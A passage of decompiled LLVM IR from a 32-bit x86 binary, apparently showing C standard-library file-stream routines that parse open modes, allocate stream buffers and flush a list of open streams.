  %v3_804bd25 = load i8, i8* %v2_804bd25, align 1
  %v12_804bd25 = icmp eq i8 %v3_804bd25, 98
  %v1_804bd25.v4_804bccf = select i1 %v12_804bd25, i32 %v1_804bd25, i32 %v4_804bccf
  store i32 %v1_804bd25.v4_804bccf, i32* %eax.global-to-local, align 4
  %v1_804bd30 = add i32 %v1_804bd25.v4_804bccf, 1
  %v2_804bd30 = inttoptr i32 %v1_804bd30 to i8*
  %v3_804bd30 = load i8, i8* %v2_804bd30, align 1
  %v12_804bd30 = icmp eq i8 %v3_804bd30, 43
  %v1_804bd34 = icmp eq i1 %v12_804bd30, false
  br i1 %v1_804bd34, label %dec_label_pc_804bd3e, label %dec_label_pc_804bd36

dec_label_pc_804bd36:                             ; preds = %dec_label_pc_804bd25
  %v1_804bd38 = or i32 %v0_804bd36, 1
  store i32 %v1_804bd38, i32* %eax.global-to-local, align 4
  %v1_804bd3b = add nuw nsw i32 %v1_804bd38, 1
  store i32 %v1_804bd3b, i32* @ebx, align 4
  br label %dec_label_pc_804bd3e

dec_label_pc_804bd3e:                             ; preds = %dec_label_pc_804bd25, %dec_label_pc_804bd36
  %v0_804bdc17 = phi i32 [ %v0_804bd36, %dec_label_pc_804bd25 ], [ %v1_804bd3b, %dec_label_pc_804bd36 ]
  %v1_804bd3e = icmp eq i32 %arg3, 0
  %v1_804bd40 = icmp eq i1 %v1_804bd3e, false
  br i1 %v1_804bd40, label %dec_label_pc_804bd74, label %dec_label_pc_804bd42

dec_label_pc_804bd42:                             ; preds = %dec_label_pc_804bd3e
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804bd47 = call i32 @function_804daaa(i32 80)
  store i32 %v1_804bd47, i32* %eax.global-to-local, align 4
  %v2_804bd4f = icmp eq i32 %v1_804bd47, 0
  store i32 %v1_804bd47, i32* @ebp, align 4
  br i1 %v2_804bd4f, label %dec_label_pc_804bf01, label %dec_label_pc_804bd59

dec_label_pc_804bd59:                             ; preds = %dec_label_pc_804bd42
  %v2_804bd47 = inttoptr i32 %v1_804bd47 to i16*
  store i16 8192, i16* %v2_804bd47, align 2
  %v2_804bd61 = add i32 %v1_804bd47, 8
  %v3_804bd61 = inttoptr i32 %v2_804bd61 to i32*
  store i32 0, i32* %v3_804bd61, align 4
  %v2_804bd68 = add i32 %v1_804bd47, 56
  store i32 %v2_804bd68, i32* %eax.global-to-local, align 4
  store i32 %v2_804bd68, i32* %stack_var_-76, align 4
  %v1_804bd6c = call i32 @function_804bf6f(i32 %v2_804bd68)
  store i32 %v1_804bd6c, i32* %eax.global-to-local, align 4
  %v0_804bdc1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bd74

dec_label_pc_804bd74:                             ; preds = %dec_label_pc_804bd3e, %dec_label_pc_804bd59
  %v2_804bdc7 = phi i32 [ %v0_804bdc17, %dec_label_pc_804bd3e ], [ %v0_804bdc1.pre, %dec_label_pc_804bd59 ]
  %v2_804bd74 = icmp slt i32 %arg4, 0
  br i1 %v2_804bd74, label %dec_label_pc_804bdc1, label %dec_label_pc_804bd78

dec_label_pc_804bd78:                             ; preds = %dec_label_pc_804bd74
  %v1_804bd7a = and i32 %v2_804bdc7, 32771
  %v1_804bd80 = add nuw nsw i32 %v1_804bd7a, 1
  store i32 %v1_804bd80, i32* @edx, align 4
  %v0_804bd81 = load i32, i32* @esi, align 4
  %v1_804bd81 = add i32 %v0_804bd81, 1
  %v2_804bd84 = and i32 %v1_804bd81, %v1_804bd80
  store i32 %v2_804bd84, i32* %eax.global-to-local, align 4
  %v12_804bd86 = icmp eq i32 %v2_804bd84, %v1_804bd80
  %v1_804bd88 = load i32, i32* @ebp, align 4
  %v2_804bd88 = add i32 %v1_804bd88, 4
  %v3_804bd88 = inttoptr i32 %v2_804bd88 to i32*
  store i32 %arg4, i32* %v3_804bd88, align 4
  %v1_804bd8b = icmp eq i1 %v12_804bd86, false
  br i1 %v1_804bd8b, label %dec_label_pc_804bcf6, label %dec_label_pc_804bd91

dec_label_pc_804bd91:                             ; preds = %dec_label_pc_804bd78
  %v0_804bd91 = load i32, i32* @esi, align 4
  %v1_804bd93 = and i32 %v0_804bd91, 1024
  %v1_804bd95 = xor i32 %v1_804bd93, 1024
  store i32 %v1_804bd95, i32* %eax.global-to-local, align 4
  %v1_804bd9a = load i32, i32* @ebx, align 4
  %v2_804bd9a = and i32 %v1_804bd9a, %v1_804bd95
  %v3_804bd9a = icmp eq i32 %v2_804bd9a, 0
  br i1 %v3_804bd9a, label %dec_label_pc_804bd91.dec_label_pc_804bdb7_crit_edge, label %dec_label_pc_804bd9e

dec_label_pc_804bd91.dec_label_pc_804bdb7_crit_edge: ; preds = %dec_label_pc_804bd91
  br label %dec_label_pc_804bdb7

dec_label_pc_804bd9e:                             ; preds = %dec_label_pc_804bd91
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v4_804bda7 = call i32 @function_804f39c(i32 %arg4, i32 4, i32 1024, i32 %v1_804bd95)
  store i32 %v4_804bda7, i32* %eax.global-to-local, align 4
  %v1_804bdaf = icmp eq i32 %v4_804bda7, 0
  %v1_804bdb1 = icmp eq i1 %v1_804bdaf, false
  br i1 %v1_804bdb1, label %dec_label_pc_804bcf6, label %dec_label_pc_804bd9e.dec_label_pc_804bdb7_crit_edge

dec_label_pc_804bd9e.dec_label_pc_804bdb7_crit_edge: ; preds = %dec_label_pc_804bd9e
  %v0_804bdb7.pre = load i32, i32* @esi, align 4
  %v0_804bdbd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804bdb7

dec_label_pc_804bdb7:                             ; preds = %dec_label_pc_804bd91.dec_label_pc_804bdb7_crit_edge, %dec_label_pc_804bd9e.dec_label_pc_804bdb7_crit_edge
  %v0_804bdbd = phi i32 [ %v1_804bd9a, %dec_label_pc_804bd91.dec_label_pc_804bdb7_crit_edge ], [ %v0_804bdbd.pre, %dec_label_pc_804bd9e.dec_label_pc_804bdb7_crit_edge ]
  %v0_804bdb7 = phi i32 [ %v0_804bd91, %dec_label_pc_804bd91.dec_label_pc_804bdb7_crit_edge ], [ %v0_804bdb7.pre, %dec_label_pc_804bd9e.dec_label_pc_804bdb7_crit_edge ]
  %v1_804bdb7 = and i32 %v0_804bdb7, 32768
  %v2_804bdbd = or i32 %v1_804bdb7, %v0_804bdbd
  store i32 %v2_804bdbd, i32* @ebx, align 4
  br label %dec_label_pc_804bde5

dec_label_pc_804bdc1:                             ; preds = %dec_label_pc_804bd74
  %v11_804bdc3 = or i32 %v2_804bdc7, 32768
  store i32 %v11_804bdc3, i32* %eax.global-to-local, align 4
  %v1_804bdc6 = add i32 %arg4, 1
  %v8_804bdc6 = icmp eq i32 %v1_804bdc6, 0
  store i32 %v1_804bdc6, i32* @edi, align 4
  %v1_804bdc7 = icmp eq i1 %v8_804bdc6, false
  %v4_804bdc7 = select i1 %v1_804bdc7, i32 %v11_804bdc3, i32 %v2_804bdc7
  store i32 %v4_804bdc7, i32* @ebx, align 4
  %v0_804bdd1 = load i32, i32* @esi, align 4
  store i32 %v0_804bdd1, i32* %stack_var_-76, align 4
  %v3_804bdd2 = inttoptr i32 %v0_804bdd1 to i8*
  %v4_804bdd2 = call i32 @function_804f6b0(i8* %v3_804bdd2, i32 %v4_804bdc7, i32 438)
  store i32 %v4_804bdd2, i32* %eax.global-to-local, align 4
  %v2_804bdda = icmp slt i32 %v4_804bdd2, 0
  %v1_804bddc = load i32, i32* @ebp, align 4
  %v2_804bddc = add i32 %v1_804bddc, 4
  %v3_804bddc = inttoptr i32 %v2_804bddc to i32*
  store i32 %v4_804bdd2, i32* %v3_804bddc, align 4
  br i1 %v2_804bdda, label %dec_label_pc_804bd09, label %dec_label_pc_804bde5

dec_label_pc_804bde5:                             ; preds = %dec_label_pc_804bdc1, %dec_label_pc_804bdb7
  %v0_804bde5 = load i32, i32* @ebp, align 4
  %v1_804bde5 = inttoptr i32 %v0_804bde5 to i32*
  %v2_804bde5 = load i32, i32* %v1_804bde5, align 4
  %v2_804bde5.tr = trunc i32 %v2_804bde5 to i16
  %v1_804bded = and i16 %v2_804bde5.tr, 8192
  %v3_804bded = inttoptr i32 %v0_804bde5 to i16*
  store i16 %v1_804bded, i16* %v3_804bded, align 2
  %v0_804bdf1 = load i32, i32* @ebx, align 4
  store i32 %v0_804bdf1, i32* %eax.global-to-local, align 4
  %v1_804bdf3 = and i32 %v0_804bdf1, -31744
  %v0_804bdf9 = load i32, i32* @ebp, align 4
  %v1_804bdf9 = inttoptr i32 %v0_804bdf9 to i32*
  %v2_804bdf9 = load i32, i32* %v1_804bdf9, align 4
  %v1_804bdfc = mul i32 %v0_804bdf1, 16
  %v1_804bdff = and i32 %v1_804bdfc, 48
  %v1_804be00 = add nuw nsw i32 %v1_804bdff, 16
  %v2_804be03 = xor i32 %v1_804be00, 48
  %v2_804be06 = or i32 %v2_804bdf9, %v1_804bdf3
  %v2_804be08 = or i32 %v2_804be06, %v2_804be03
  store i32 %v2_804be08, i32* %eax.global-to-local, align 4
  %v1_804be0a = trunc i32 %v2_804be08 to i16
  %v3_804be0a = inttoptr i32 %v0_804bdf9 to i16*
  store i16 %v1_804be0a, i16* %v3_804be0a, align 2
  %v0_804be0e = load i32, i32* %stack_var_-76, align 4
  %v1_804be0e = call i32 @function_804b7f4(i32 %v0_804be0e)
  store i32 %v1_804be0e, i32* %eax.global-to-local, align 4
  %v0_804be16 = load i32, i32* @ebp, align 4
  %v1_804be16 = inttoptr i32 %v0_804be16 to i16*
  %v2_804be16 = load i16, i16* %v1_804be16, align 2
  %v3_804be16 = zext i16 %v2_804be16 to i32
  store i32 %v3_804be16, i32* @ebx, align 4
  %v1_804be1a = inttoptr i32 %v1_804be0e to i32*
  %v2_804be1a = load i32, i32* %v1_804be1a, align 4
  store i32 %v2_804be1a, i32* @edi, align 4
  store i32 %v1_804be0e, i32* @esi, align 4
  %v1_804be1e = add i32 %v0_804be16, 4
  %v2_804be1e = inttoptr i32 %v1_804be1e to i32*
  %v3_804be1e = load i32, i32* %v2_804be1e, align 4
  store i32 %v3_804be1e, i32* %stack_var_-76, align 4
  %v1_804be21 = call i32 @function_804d3d8(i32 %v3_804be1e)
  %v2_804be29 = mul i32 %v1_804be21, 256
  store i32 %v2_804be29, i32* %eax.global-to-local, align 4
  %v0_804be2c = load i32, i32* @ebx, align 4
  %v2_804be2c = or i32 %v0_804be2c, %v2_804be29
  store i32 %v2_804be2c, i32* @ebx, align 4
  %v1_804be2e = trunc i32 %v2_804be2c to i16
  %v2_804be2e = load i32, i32* @ebp, align 4
  %v3_804be2e = inttoptr i32 %v2_804be2e to i16*
  store i16 %v1_804be2e, i16* %v3_804be2e, align 2
  %v0_804be32 = load i32, i32* @edi, align 4
  %v1_804be32 = load i32, i32* @esi, align 4
  %v2_804be32 = inttoptr i32 %v1_804be32 to i32*
  store i32 %v0_804be32, i32* %v2_804be32, align 4
  %v0_804be34 = load i32, i32* @ebp, align 4
  %v1_804be34 = add i32 %v0_804be34, 8
  %v2_804be34 = inttoptr i32 %v1_804be34 to i32*
  %v3_804be34 = load i32, i32* %v2_804be34, align 4
  %v4_804be34 = icmp eq i32 %v3_804be34, 0
  %v1_804be38 = icmp eq i1 %v4_804be34, false
  br i1 %v1_804be38, label %dec_label_pc_804be6c, label %dec_label_pc_804be3a

dec_label_pc_804be3a:                             ; preds = %dec_label_pc_804bde5
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804be42 = call i32 @function_804daaa(i32 4096)
  store i32 %v1_804be42, i32* %eax.global-to-local, align 4
  %v1_804be4a = icmp eq i32 %v1_804be42, 0
  %v1_804be4c = load i32, i32* @ebp, align 4
  %v2_804be4c = add i32 %v1_804be4c, 8
  %v3_804be4c = inttoptr i32 %v2_804be4c to i32*
  store i32 %v1_804be42, i32* %v3_804be4c, align 4
  br i1 %v1_804be4a, label %dec_label_pc_804be65, label %dec_label_pc_804be51

dec_label_pc_804be51:                             ; preds = %dec_label_pc_804be3a
  %v1_804be51 = add i32 %v1_804be42, 4096
  store i32 %v1_804be51, i32* %eax.global-to-local, align 4
  %v1_804be56 = load i32, i32* @ebp, align 4
  %v2_804be56 = add i32 %v1_804be56, 12
  %v3_804be56 = inttoptr i32 %v2_804be56 to i32*
  store i32 %v1_804be51, i32* %v3_804be56, align 4
  %v0_804be59 = load i32, i32* @ebp, align 4
  %v1_804be59 = inttoptr i32 %v0_804be59 to i32*
  %v2_804be59 = load i32, i32* %v1_804be59, align 4
  %v1_804be5c = udiv i32 %v2_804be59, 256
  %v3_804be5c = and i32 %v1_804be5c, 191
  %v8_804be5c = or i32 %v3_804be5c, 64
  %v10_804be5c = mul nuw nsw i32 %v8_804be5c, 256
  %v11_804be5c = and i32 %v2_804be59, -65281
  %v12_804be5c = or i32 %v10_804be5c, %v11_804be5c
  store i32 %v12_804be5c, i32* %eax.global-to-local, align 4
  %v1_804be5f = trunc i32 %v12_804be5c to i16
  %v3_804be5f = inttoptr i32 %v0_804be59 to i16*
  store i16 %v1_804be5f, i16* %v3_804be5f, align 2
  br label %dec_label_pc_804be6c

dec_label_pc_804be65:                             ; preds = %dec_label_pc_804be3a
  %v0_804be65 = load i32, i32* @ebp, align 4
  %v1_804be65 = add i32 %v0_804be65, 12
  %v2_804be65 = inttoptr i32 %v1_804be65 to i32*
  store i32 0, i32* %v2_804be65, align 4
  br label %dec_label_pc_804be6c

dec_label_pc_804be6c:                             ; preds = %dec_label_pc_804bde5, %dec_label_pc_804be51, %dec_label_pc_804be65
  %v0_804be6c = load i32, i32* @ebp, align 4
  %v1_804be6c = add i32 %v0_804be6c, 8
  %v2_804be6c = inttoptr i32 %v1_804be6c to i32*
  %v3_804be6c = load i32, i32* %v2_804be6c, align 4
  store i32 %v3_804be6c, i32* %eax.global-to-local, align 4
  %v1_804be6f = add i32 %v0_804be6c, 2
  %v2_804be6f = inttoptr i32 %v1_804be6f to i8*
  store i8 0, i8* %v2_804be6f, align 1
  %v0_804be73 = load i32, i32* @ebp, align 4
  %v1_804be73 = add i32 %v0_804be73, 44
  %v2_804be73 = inttoptr i32 %v1_804be73 to i32*
  store i32 0, i32* %v2_804be73, align 4
  %v0_804be7a = load i32, i32* @ebp, align 4
  %v1_804be7a = add i32 %v0_804be7a, 1
  %v2_804be7a = inttoptr i32 %v1_804be7a to i8*
  %v3_804be7a = load i8, i8* %v2_804be7a, align 1
  %v4_804be7a = and i8 %v3_804be7a, 32
  %v5_804be7a = icmp eq i8 %v4_804be7a, 0
  %v0_804be7e = load i32, i32* %eax.global-to-local, align 4
  %v2_804be7e = add i32 %v0_804be7a, 24
  %v3_804be7e = inttoptr i32 %v2_804be7e to i32*
  store i32 %v0_804be7e, i32* %v3_804be7e, align 4
  %v0_804be81 = load i32, i32* %eax.global-to-local, align 4
  %v1_804be81 = load i32, i32* @ebp, align 4
  %v2_804be81 = add i32 %v1_804be81, 28
  %v3_804be81 = inttoptr i32 %v2_804be81 to i32*
  store i32 %v0_804be81, i32* %v3_804be81, align 4
  %v0_804be84 = load i32, i32* %eax.global-to-local, align 4
  %v1_804be84 = load i32, i32* @ebp, align 4
  %v2_804be84 = add i32 %v1_804be84, 16
  %v3_804be84 = inttoptr i32 %v2_804be84 to i32*
  store i32 %v0_804be84, i32* %v3_804be84, align 4
  %v0_804be87 = load i32, i32* %eax.global-to-local, align 4
  %v1_804be87 = load i32, i32* @ebp, align 4
  %v2_804be87 = add i32 %v1_804be87, 20
  %v3_804be87 = inttoptr i32 %v2_804be87 to i32*
  store i32 %v0_804be87, i32* %v3_804be87, align 4
  %v0_804be8a = load i32, i32* @global_var_8055b90.115, align 16
  store i32 %v0_804be8a, i32* @eax, align 4
  %v1_804be8f = load i32, i32* @ebp, align 4
  %v2_804be8f = add i32 %v1_804be8f, 52
  %v3_804be8f = inttoptr i32 %v2_804be8f to i32*
  store i32 %v0_804be8a, i32* %v3_804be8f, align 4
  br i1 %v5_804be7a, label %dec_label_pc_804bf01, label %dec_label_pc_804be94

dec_label_pc_804be94:                             ; preds = %dec_label_pc_804be6c
  %v2_804be9f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804be9f, i32* %stack_var_-76, align 4
  %v2_804bea4 = call i32 @function_804f016(i32 %v2_804be9f, i32 134541331)
  store i32 %v2_804bea4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055b78.107 to i32), i32* %stack_var_-76, align 4
  %v1_804beb0 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055b78.107 to i32))
  store i32 %v1_804beb0, i32* @eax, align 4
  %v2_804bec2 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804bec2, i32* %stack_var_-76, align 4
  %v2_804bec7 = call i32 @function_804f016(i32 %v2_804bec2, i32 134541331)
  store i32 %v2_804bec7, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8055b60.116 to i32), i32* %stack_var_-76, align 4
  %v1_804bed3 = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055b60.116 to i32))
  %v0_804bed8 = load i32, i32* bitcast (i32** @global_var_8055b5c.117 to i32*), align 4
  store i32 %v0_804bed8, i32* @eax, align 4
  %v1_804bedd = load i32, i32* @ebp, align 4
  %v2_804bedd = add i32 %v1_804bedd, 32
  %v3_804bedd = inttoptr i32 %v2_804bedd to i32*
  store i32 %v0_804bed8, i32* %v3_804bedd, align 4
  %v2_804bee0 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804bee0, i32* @ecx, align 4
  %v0_804bee1 = load i32, i32* @ebp, align 4
  store i32 %v0_804bee1, i32* bitcast (i32** @global_var_8055b5c.117 to i32*), align 4
  store i32 %v2_804bec2, i32* %stack_var_-76, align 4
  %v2_804beeb = call i32 @function_804f016(i32 %v2_804bec2, i32 1)
  store i32 %v2_804bec2, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_804be9f, i32* %stack_var_-76, align 4
  %v2_804bef5 = call i32 @function_804f016(i32 %v2_804be9f, i32 1)
  br label %dec_label_pc_804befa

dec_label_pc_804befa:                             ; preds = %dec_label_pc_804bd13, %dec_label_pc_804be94
  %storemerge = phi i32 [ %v2_804bef5, %dec_label_pc_804be94 ], [ %v1_804bd19, %dec_label_pc_804bd13 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bf01

dec_label_pc_804beff:                             ; preds = %dec_label_pc_804bd09, %dec_label_pc_804bcf6
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804bf01

dec_label_pc_804bf01:                             ; preds = %dec_label_pc_804be6c, %dec_label_pc_804bd42, %dec_label_pc_804befa, %dec_label_pc_804beff
  %v0_804bf04 = load i32, i32* @ebp, align 4
  store i32 %v0_804bf04, i32* %eax.global-to-local, align 4
  %v2_804bf06 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804bf06, i32* @ebx, align 4
  store i32 %v0_804bcca, i32* @esi, align 4
  store i32 %v0_804bcc9, i32* @edi, align 4
  store i32 %v0_804bcc8, i32* @ebp, align 4
  ret i32 %v0_804bf04

; uselistorder directives
  uselistorder i32 %v2_804bec2, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_804be9f, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804be59, { 1, 0 }
  uselistorder i32 %v1_804be42, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804be29, { 1, 0 }
  uselistorder i32 %v1_804be0e, { 1, 0, 2 }
  uselistorder i32 %v11_804bdc3, { 1, 0 }
  uselistorder i32 %v1_804bd95, { 2, 1, 0 }
  uselistorder i32 %v0_804bd91, { 1, 0 }
  uselistorder i32 %v2_804bdc7, { 1, 0, 2 }
  uselistorder i32 %v1_804bd47, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 27 }
  uselistorder i32 %arg4, { 3, 1, 0, 2, 4, 5 }
  uselistorder label %dec_label_pc_804bf01, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804befa, { 1, 0 }
  uselistorder label %dec_label_pc_804be6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bdb7, { 1, 0 }
  uselistorder label %dec_label_pc_804bd74, { 1, 0 }
  uselistorder label %dec_label_pc_804bd3e, { 1, 0 }
  uselistorder label %dec_label_pc_804bd25, { 2, 0, 1 }
}

define i32 @function_804bf0c() local_unnamed_addr {
dec_label_pc_804bf0c:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bf0d = load i32, i32* @edi, align 4
  %v0_804bf0e = load i32, i32* @esi, align 4
  %v0_804bf0f = load i32, i32* @ebx, align 4
  store i32 %v0_804bf0f, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_804bf18 = call i32 @function_804b7f4(i32 %v0_804bf0f)
  %v0_804bf20 = load i16, i16* @global_var_8055ba0.103, align 32
  %v1_804bf20 = zext i16 %v0_804bf20 to i32
  store i32 %v1_804bf20, i32* @esi, align 4
  %v1_804bf27 = inttoptr i32 %v1_804bf18 to i32*
  %v2_804bf27 = load i32, i32* %v1_804bf27, align 4
  store i32 %v2_804bf27, i32* %ebp.global-to-local, align 4
  store i32 %v1_804bf18, i32* @edi, align 4
  %v1_804bf2d = call i32 @function_804d3d8(i32 0)
  %v0_804bf32 = load i32, i32* @ebx, align 4
  %v2_804bf3b = sub i32 %v0_804bf32, %v1_804bf2d
  %v2_804bf3f = mul i32 %v2_804bf3b, 256
  %v0_804bf42 = load i32, i32* @esi, align 4
  %v2_804bf42 = xor i32 %v0_804bf42, %v2_804bf3f
  %v1_804bf44 = trunc i32 %v2_804bf42 to i16
  store i16 %v1_804bf44, i16* @global_var_8055ba0.103, align 32
  %v0_804bf4b = load i16, i16* @global_var_8055bf0.104, align 16
  %v1_804bf4b = zext i16 %v0_804bf4b to i32
  store i32 %v1_804bf4b, i32* @esi, align 4
  %v1_804bf52 = call i32 @function_804d3d8(i32 1)
  %v0_804bf57 = load i32, i32* @ebx, align 4
  %v2_804bf57 = sub i32 %v0_804bf57, %v1_804bf52
  %v2_804bf59 = mul i32 %v2_804bf57, 256
  %v0_804bf5c = load i32, i32* @esi, align 4
  %v2_804bf5c = xor i32 %v2_804bf59, %v0_804bf5c
  %v1_804bf5e = trunc i32 %v2_804bf5c to i16
  store i16 %v1_804bf5e, i16* @global_var_8055bf0.104, align 16
  %v0_804bf65 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804bf65 = load i32, i32* @edi, align 4
  %v2_804bf65 = inttoptr i32 %v1_804bf65 to i32*
  store i32 %v0_804bf65, i32* %v2_804bf65, align 4
  %v2_804bf6a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804bf6a, i32* @ebx, align 4
  store i32 %v0_804bf0e, i32* @esi, align 4
  store i32 %v0_804bf0d, i32* @edi, align 4
  ret i32 %v1_804bf52

; uselistorder directives
  uselistorder i32 %v1_804bf18, { 1, 0 }
  uselistorder i16* @global_var_8055bf0.104, { 1, 0 }
  uselistorder i32 (i32)* @function_804d3d8, { 1, 0, 2 }
}

define i32 @function_804bf6f(i32 %arg1) local_unnamed_addr {
dec_label_pc_804bf6f:
  %v3_804bf7d = inttoptr i32 %arg1 to i16*
  %v4_804bf7d = call i32 @function_804d1a8(i16* %v3_804bf7d, i32 ptrtoint (i32* @global_var_80533cc.118 to i32), i32 24)
  ret i32 %v4_804bf7d
}

define i32 @function_804bf86() local_unnamed_addr {
dec_label_pc_804bf86:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804bf86 = load i32, i32* @esi, align 4
  %v0_804bf87 = load i32, i32* @ebx, align 4
  store i32 %v0_804bf87, i32* %stack_var_-8, align 4
  %v1_804bf90 = call i32 @function_804bf6f(i32 ptrtoint (i32* @global_var_8055b60.116 to i32))
  store i32 %v1_804bf90, i32* %eax.global-to-local, align 4
  %v1_804bf9c = call i32 @function_804bf6f(i32 ptrtoint (i32* @global_var_8055b78.107 to i32))
  store i32 %v1_804bf9c, i32* %eax.global-to-local, align 4
  %storemerge21 = load i32, i32* bitcast (i32** @global_var_8055b5c.117 to i32*), align 4
  store i32 %storemerge21, i32* %ebx.global-to-local, align 4
  %v1_804bfe622 = icmp eq i32 %storemerge21, 0
  %v1_804bfe824 = icmp eq i1 %v1_804bfe622, false
  br i1 %v1_804bfe824, label %dec_label_pc_804bfa9.lr.ph, label %dec_label_pc_804c006.preheader

dec_label_pc_804bfa9.lr.ph:                       ; preds = %dec_label_pc_804bf86
  br label %dec_label_pc_804bfa9

dec_label_pc_804bfa9:                             ; preds = %dec_label_pc_804bfa9.lr.ph, %dec_label_pc_804bfd0
  %storemerge25 = phi i32 [ %storemerge21, %dec_label_pc_804bfa9.lr.ph ], [ %storemerge, %dec_label_pc_804bfd0 ]
  %v1_804bfac = add i32 %storemerge25, 56
  store i32 %v1_804bfac, i32* @esi, align 4
  %v1_804bfb0 = call i32 @function_804f013(i32 %v1_804bfac)
  store i32 %v1_804bfb0, i32* %eax.global-to-local, align 4
  %v1_804bfb8 = icmp eq i32 %v1_804bfb0, 0
  br i1 %v1_804bfb8, label %dec_label_pc_804bfd0, label %dec_label_pc_804bfbc

dec_label_pc_804bfbc:                             ; preds = %dec_label_pc_804bfa9
  %v0_804bfbc = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bfbc = add i32 %v0_804bfbc, 8
  %v2_804bfbc = inttoptr i32 %v1_804bfbc to i32*
  %v3_804bfbc = load i32, i32* %v2_804bfbc, align 4
  store i32 %v3_804bfbc, i32* %eax.global-to-local, align 4
  %v1_804bfbf = inttoptr i32 %v0_804bfbc to i16*
  store i16 48, i16* %v1_804bfbf, align 2
  %v0_804bfc4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bfc4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bfc4 = add i32 %v1_804bfc4, 24
  %v3_804bfc4 = inttoptr i32 %v2_804bfc4 to i32*
  store i32 %v0_804bfc4, i32* %v3_804bfc4, align 4
  %v0_804bfc7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804bfc7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bfc7 = add i32 %v1_804bfc7, 28
  %v3_804bfc7 = inttoptr i32 %v2_804bfc7 to i32*
  store i32 %v0_804bfc7, i32* %v3_804bfc7, align 4
  %v0_804bfca = load i32, i32* %eax.global-to-local, align 4
  %v1_804bfca = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bfca = add i32 %v1_804bfca, 16
  %v3_804bfca = inttoptr i32 %v2_804bfca to i32*
  store i32 %v0_804bfca, i32* %v3_804bfca, align 4
  %v0_804bfcd = load i32, i32* %eax.global-to-local, align 4
  %v1_804bfcd = load i32, i32* %ebx.global-to-local, align 4
  %v2_804bfcd = add i32 %v1_804bfcd, 20
  %v3_804bfcd = inttoptr i32 %v2_804bfcd to i32*
  store i32 %v0_804bfcd, i32* %v3_804bfcd, align 4
  br label %dec_label_pc_804bfd0

dec_label_pc_804bfd0:                             ; preds = %dec_label_pc_804bfa9, %dec_label_pc_804bfbc
  %v0_804bfd3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bfd3 = add i32 %v0_804bfd3, 52
  %v2_804bfd3 = inttoptr i32 %v1_804bfd3 to i32*
  store i32 1, i32* %v2_804bfd3, align 4
  %v0_804bfda = load i32, i32* @esi, align 4
  %v1_804bfdb = call i32 @function_804bf6f(i32 %v0_804bfda)
  store i32 %v1_804bfdb, i32* %eax.global-to-local, align 4
  %v0_804bfe0 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804bfe0 = add i32 %v0_804bfe0, 32
  %v2_804bfe0 = inttoptr i32 %v1_804bfe0 to i32*
  %storemerge = load i32, i32* %v2_804bfe0, align 4
  store i32 %storemerge, i32* %ebx.global-to-local, align 4
  %v1_804bfe6 = icmp eq i32 %storemerge, 0
  %v1_804bfe8 = icmp eq i1 %v1_804bfe6, false
  br i1 %v1_804bfe8, label %dec_label_pc_804bfa9, label %dec_label_pc_804bfe3.dec_label_pc_804c006.preheader_crit_edge

dec_label_pc_804bfe3.dec_label_pc_804c006.preheader_crit_edge: ; preds = %dec_label_pc_804bfd0
  %storemerge12.pre = load i32, i32* bitcast (i32** @global_var_8055b5c.117 to i32*), align 4
  br label %dec_label_pc_804c006.preheader

dec_label_pc_804c006.preheader:                   ; preds = %dec_label_pc_804bfe3.dec_label_pc_804c006.preheader_crit_edge, %dec_label_pc_804bf86
  %storemerge12 = phi i32 [ %storemerge12.pre, %dec_label_pc_804bfe3.dec_label_pc_804c006.preheader_crit_edge ], [ %storemerge21, %dec_label_pc_804bf86 ]
  store i32 %storemerge12, i32* @ebx, align 4
  %v1_804c0063 = icmp eq i32 %storemerge12, 0
  %v1_804c00810 = icmp eq i1 %v1_804c0063, false
  br i1 %v1_804c00810, label %dec_label_pc_804bff2.preheader, label %dec_label_pc_804c00a

dec_label_pc_804bff2.preheader:                   ; preds = %dec_label_pc_804c006.preheader
  br label %dec_label_pc_804bff2

dec_label_pc_804bff2:                             ; preds = %dec_label_pc_804bff2.preheader, %dec_label_pc_804c003
